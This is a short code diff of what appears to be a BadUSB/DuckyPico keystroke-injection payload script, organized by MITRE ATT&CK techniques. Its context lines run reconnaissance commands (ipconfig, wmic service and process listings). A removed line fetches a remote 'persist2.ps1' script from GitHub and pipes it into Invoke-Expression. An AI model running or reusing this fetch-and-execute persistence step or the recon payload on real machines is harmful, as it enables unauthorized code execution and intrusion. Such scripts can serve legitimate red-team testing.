@@ -8,7 +8,6 @@
 !!ipconfig
 ##!!wmic wmic service get Name,DisplayName,State,StartMode,ProcessId /format:table
 ##!!wmic process get Name,ProcessId,ParentProcessId,Priority,CreationDate /format:table
-##!!iwr https://raw.githubusercontent.com/JH517/DuckyPico/refs/heads/main/persist2.ps1 | iex
 ##Impact----------------------------------------------------------------------------
 ##T1565 Data Manipulation
 ##New-Item -Path "C:\Users\Leonardo\Desktop\new.txt" -ItemType File -Force
